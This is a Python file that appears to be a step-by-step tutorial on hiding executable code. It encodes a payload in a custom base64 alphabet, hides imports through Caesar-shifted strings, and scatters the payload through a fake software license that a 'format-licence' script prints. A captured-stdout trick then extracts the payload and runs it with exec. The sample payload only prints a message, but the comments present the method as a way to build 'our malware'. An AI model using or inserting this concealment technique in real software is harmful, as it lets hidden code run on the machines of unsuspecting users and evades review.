"""TBA"""
import base64

# Firstly, let's talk about how we can execute a payload.

payload_str = "print('Hehe, I am malware')"

payload_1 = [ord(c) for c in payload_str]
print(payload_1)
print(''.join(chr(n) for n in payload_1))


def encode_cbase(data: bytes, *_, charset: str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_.,()&:#';§") -> str:
    encoded = base64.urlsafe_b64encode(data).decode("utf-8").rstrip("=")
    return "".join(
            c if c not in "0123456789" else charset[int(c) + (64 - 10)]
            for c in encoded
    )


def decode_cbase(data: str, *_, charset: str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_.,()&:#';§") -> bytes:
    standard_encoded = "".join(
        c if c in charset[0:54] else str(
            charset.index(c) - (64 - 10))
        for c in data
    )
    padding = "=" * (-len(standard_encoded) % 4)
    return base64.urlsafe_b64decode(standard_encoded + padding)


payload_2 = encode_cbase(payload_str.encode())
print(payload_2)
print(decode_cbase(payload_2).decode())

# The custom base approach seems the most, let's say inconspicuous
# Here are the hidden versions of it


def encode_cbase(data: bytes, *_, charset: str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_.,()&:#';§") -> str:
    return ''.join(c if c not in "0123456789" else charset[int(c) + (64 - 10)] for c in getattr(__import__(''.join([chr(ord(c) - 2) for c in "dcug86"])), "".join([chr(c - 26) for c in b"\x8f\x8c\x86\x8d{\x80\x7fy|PN\x7f\x88}\x89~\x7f"]))(data).decode('utf-8').rstrip('='))


def decode_cbase(data: str, *_, charset: str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_.,()&:#';§") -> bytes:
    return getattr(__import__(''.join([chr(ord(c) - 2) for c in "dcug86"])), "".join([chr(ord(c) - 4) for c in "yvpwejicf:8higshi"]))(''.join(c if c in charset[0:54] else str(charset.index(c) - (64 - 10)) for c in data) + ('=' * (-len(data) % 4)))


# These still work as expected, but don't openly import anything and are harder to read.
payload_2 = encode_cbase(payload_str.encode())
print(payload_2)
print(decode_cbase(payload_2).decode())


# Next up, we need to solve how we can execute our payload.
exec(decode_cbase(payload_2).decode())
# This would be great, but is easily detectable
import sys  # We assume sys is imported
print("Some shit"); _, __, x, y = setattr, getattr, __import__, lambda _, __: "".join(chr(ord(___) - __) for ___ in _); _(sys, y("wxhsyx", 4), __(x(y("nt", 5)), y("h\x89\x87~\x83|^d", 21))())
print(payload_2, end=""); locals()["b"] = sys.stdout; sys.stdout = sys.__stdout__; exec(decode_cbase(b.getvalue()).decode())

# This is a lot better :)
# But we still print payload_2, what can we do about that? Hide it!

some_long_text = """
Software License Agreement (Extended)

This software is provided under the following terms and conditions. By copying, modifying, distributing, or using this software, you agree to be bound by the terms of this license.

1. **MANDATORY DISPLAY OF LICENSE**:
   1.1. Any project using this software, whether in source or compiled form, in whole or in part, must include this license printed or displayed in its documentation, about section, or as part of its runtime startup sequence.
   1.2. The license must be formatted and displayed using the `format-licence.py` script included alongside this license file. No alternative means of formatting or displaying this license is permitted.
   1.3. Failure to adhere to these display requirements constitutes a violation of this license and automatically terminates all rights granted herein.

2. **USE RESTRICTIONS**:
   2.1. This license applies only to the portions of a project that directly include or depend on the code provided under this license.
   2.2. Other parts of the project that do not include, link to, or rely on this software are not subject to the restrictions or obligations of this license.
   2.3. Any use of the software in a project that conceals or misrepresents its association with this license is strictly prohibited.

3. **GRANT OF RIGHTS**:
   3.1. You are granted the right to use, copy, modify, and distribute this software, subject to the conditions of this license.
   3.2. You may distribute modified versions of the software provided:
       a. You include this license in its unaltered form.
       b. You include the `format-licence.py` script for proper display of the license.
       c. You document all changes made to the original software.
   3.3. You may distribute the software in compiled or executable form provided you also include:
       a. A copy of this license.
       b. The `format-licence.py` script.
       c. Clear instructions on how the license can be accessed and displayed.

4. **DISTRIBUTION OF DERIVATIVE WORKS**:
   4.1. If you create derivative works based on this software, those works must also be licensed under the same terms as this license.
   4.2. Derivative works must preserve the functionality of the `format-licence.py` script and the requirement to display the license as specified.

5. **COMPATIBILITY WITH OTHER LICENSES**:
   5.1. This software may be combined with other code licensed under compatible terms, provided:
       a. Such combination does not remove or override the display requirement of this license.
       b. Users of the combined work are clearly informed of which parts of the work are governed by this license.
   5.2. The license does not impose restrictions on portions of the combined work that are independently licensed and do not directly depend on this software.

6. **NO WARRANTY**:
   6.1. THIS SOFTWARE IS PROVIDED "AS IS," WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, AND NONINFRINGEMENT.
   6.2. THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE SOFTWARE IS WITH YOU.
   6.3. SHOULD THE SOFTWARE PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING, REPAIR, OR CORRECTION.

7. **LIMITATION OF LIABILITY**:
   7.1. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES, OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT, OR OTHERWISE, ARISING FROM, OUT OF, OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

8. **TERMINATION**:
   8.1. Your rights under this license terminate automatically if you fail to comply with any of the terms herein.
   8.2. Upon termination, you must cease all use, distribution, and modification of the software and destroy all copies in your possession.

9. **MISCELLANEOUS PROVISIONS**:
   9.1. If any provision of this license is held to be unenforceable, such provision shall be reformed only to the extent necessary to make it enforceable.
   9.2. This license shall be governed by the laws of the jurisdiction in which the software is used.

By using, copying, modifying, or distributing the software, you accept all terms and conditions of this license.

You agree to prominently display this license using the `format-licence.py` script whenever it is presented in any form.
"""


def insert_evenly(base, ins) -> str:
    step = len(base) // (len(ins) + 1)
    return ''.join(base[i * step:(i + 1) * step] + (ins[i] if i < len(ins) else '') for i in range(len(ins) + 1))


hidden_payload_2 = insert_evenly(some_long_text, payload_2)
print(repr(hidden_payload_2))  # <- Now that's hidden :D

# Next we need to find a small lambda to reverse this.
reverse = lambda s, l: (
    ''.join(s[i * (len(s) // (l + 1) + 1):i * (len(s) // (l + 1) + 1) + len(s) // (l + 1)] for i in range(l + 1)),
    ''.join(s[i * (len(s) // (l + 1) + 1) + len(s) // (l + 1)] for i in range(l))
)

base, extracted_payload = reverse(hidden_payload_2, len(payload_2))
print(extracted_payload, base == some_long_text)
print(len(payload_2))

# Okay, now let's add this to our malware!
print("We need to print this license as we use the code, luckily the license never needs 'us' to actually adopt it in any other way than printing it, I put it in another file so it's clear that it only applies to this piece of code an nothing else"); _, __, x, y = setattr, getattr, __import__, lambda _, __: "".join(chr(ord(___) - __) for ___ in _); _(sys, y("wxhsyx", 4), __(x(y("nt", 5)), y("h\x89\x87~\x83|^d", 21))()); _, ___ = lambda s, l: (''.join(s[i * (len(s) // (l + 1) + 1):i * (len(s) // (l + 1) + 1) + len(s) // (l + 1)] for i in range(l + 1)),''.join(s[i * (len(s) // (l + 1) + 1) + len(s) // (l + 1)] for i in range(l))), lambda d, c: getattr(__import__(''.join([chr(ord(k) - 2) for k in "dcug86"])),"".join([chr(ord(k) - 4) for k in "yvpwejicf:8higshi"]))(''.join(k if k in c[0:54] else str(c.index(k) - (64 - 10)) for k in d) + ('=' * (-len(d) % 4)))
print('\nSoftware License Agreement (Extended)\n\nThis software is provided under the following terms and conditions. By copyincg, modifying, distributing, or using this software, you agree to be bound by the terms of this license.\n\n1. **MANDATOHRY DISPLAY OF LICENSE**:\n   1.1. Any project using this software, whether in source or compiled form, in whole or in Jpart, must include this license printed or displayed in its documentation, about section, or as part of its runtime sptartup sequence.\n   1.2. The license must be formatted and displayed using the `format-licence.py` script included albongside this license file. No alternative means of formatting or displaying this license is permitted.\n   1.3. Failurne to adhere to these display requirements constitutes a violation of this license and automatically terminates all riQghts granted herein.\n\n2. **USE RESTRICTIONS**:\n   2.1. This license applies only to the portions of a project that diorectly include or depend on the code provided under this license.\n   2.2. Other parts of the project that do not inclJude, link to, or rely on this software are not subject to the restrictions or obligations of this license.\n   2.3. An.y use of the software in a project that conceals or misrepresents its association with this license is strictly prohihbited.\n\n3. **GRANT OF RIGHTS**:\n   3.1. You are granted the right to use, copy, modify, and distribute this software,l subject to the conditions of this license.\n   3.2. You may distribute modified versions of the software provided:\n  a     a. You include this license in its unaltered form.\n       b. You include the `format-licence.py` script for propGer display of the license.\n       c. You document all changes made to the original software.\n   3.3. You may distribuUte the software in compiled or executable form provided you also include:\n       a. A copy of this license.\n       b.s The `format-licence.py` script.\n       c. Clear instructions on how the license can be accessed and displayed.\n\n4. *I*DISTRIBUTION OF DERIVATIVE WORKS**:\n   4.1. If you create derivative works based on this software, those works must Ealso be licensed under the same terms as this license.\n   4.2. Derivative works must preserve the functionality of thke `format-licence.py` script and the requirement to display the license as specified.\n\n5. **COMPATIBILITY WITH OTHER gLICENSES**:\n   5.1. This software may be combined with other code licensed under compatible terms, provided:\n       aY. Such combination does not remove or override the display requirement of this license.\n       b. Users of the combinWed work are clearly informed of which parts of the work are governed by this license.\n   5.2. The license does not im.pose restrictions on portions of the combined work that are independently licensed and do not directly depend on thisg software.\n\n6. **NO WARRANTY**:\n   6.1. THIS SOFTWARE IS PROVIDED "AS IS," WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IbMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, AND NONINFRWINGEMENT.\n   6.2. THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE SOFTWARE IS WITH YOU.\n   6.3. SHOULD THE SFOFTWARE PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING, REPAIR, OR CORRECTION.\n\n7. **LIMITATION OF LsIABILITY**:\n   7.1. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES, OR OTHER LIAdBILITY, WHETHER IN AN ACTION OF CONTRACT, TORT, OR OTHERWISE, ARISING FROM, OUT OF, OR IN CONNECTION WITH THE SOFTWAR(E OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n\n8. **TERMINATION**:\n   8.1. Your rights under this license terminateF automatically if you fail to comply with any of the terms herein.\n   8.2. Upon termination, you must cease all use, ydistribution, and modification of the software and destroy all copies in your possession.\n\n9. **MISCELLANEOUS PROVISIZONS**:\n   9.1. If any provision of this license is held to be unenforceable, such provision shall be reformed only toS the extent necessary to make it enforceable.\n   9.2. This license shall be governed by the laws of the jurisdiction cin which the software is used.\n\nBy using, copying, modifying, or distributing the software, you accept all terms and pconditions of this license.\n\nYou agree to prominently display this license using the `format-licence.py` script whene', end=""); locals()["b"] = sys.stdout; sys.stdout = sys.__stdout__; b, p = _(b.getvalue(), 36); sys.stdout.write(b); sys.stdout.flush(); __(x(y("dwknvkpu", 2)), y('\x98«\x98\x96', 51))(___(p, y('\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0¡¢£¤¥¦§¨©ª«²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊË~°\x7f}yzw\x8btx\x8cø', 81)).decode()); del _, __, ___, x, y, b, p


# Now let's analyze what we do here.
# _, __, x, y = ...
setattr_, getattr_, imp, caesar_cipher = setattr, getattr, __import__, lambda cipher, key: "".join(chr(ord(c) - key) for c in cipher)
setattr_(sys,
         caesar_cipher("wxhsyx", 4),
         getattr_(
             imp(caesar_cipher("nt", 5)),
             caesar_cipher("h\x89\x87~\x83|^d", 21))())
# This breaks down to sys.stdout = io.StringIO()

# Onto the next chunk
# _, ___ = ...
reverse_ = lambda s, l: (''.join(s[i * (len(s) // (l + 1) + 1):i * (len(s) // (l + 1) + 1) + len(s) // (l + 1)] for i in range(l + 1)),''.join(s[i * (len(s) // (l + 1) + 1) + len(s) // (l + 1)] for i in range(l)))
decode_cbase_ = lambda d, c: getattr(__import__(''.join([chr(ord(k) - 2) for k in "dcug86"])),"".join([chr(ord(k) - 4) for k in "yvpwejicf:8higshi"]))(''.join(k if k in c[0:54] else str(c.index(k) - (64 - 10)) for k in d) + ('=' * (-len(d) % 4)))

# Now we discretely get the hidden_payload_2
print(hidden_payload_2, end="")
locals()["b"] = sys.stdout  # b = sys.stdout, we get back the StringIO()
sys.stdout = sys.__stdout__  # We reset sys.stdout
base, payload = reverse_(b.getvalue(), 36)  # The 36 here is the precomputed length of the payload
sys.stdout.write(base); sys.stdout.flush()  # Write actual licence agreement
getattr_(
    imp(caesar_cipher("dwknvkpu", 2)),
    caesar_cipher('\x98«\x98\x96', 51)
)(decode_cbase_(payload, caesar_cipher(
    '\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0¡¢£¤¥¦§¨©ª«²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊË~°\x7f}yzw\x8btx\x8cø', 81)).decode()
)
# This boils down to import builtins; builtins.exec(decode_cbase(p).decode())
# Cleaning up
# Some others are overwritten so we don't delete them here
del reverse_, getattr_, decode_cbase_, imp, caesar_cipher, base, payload
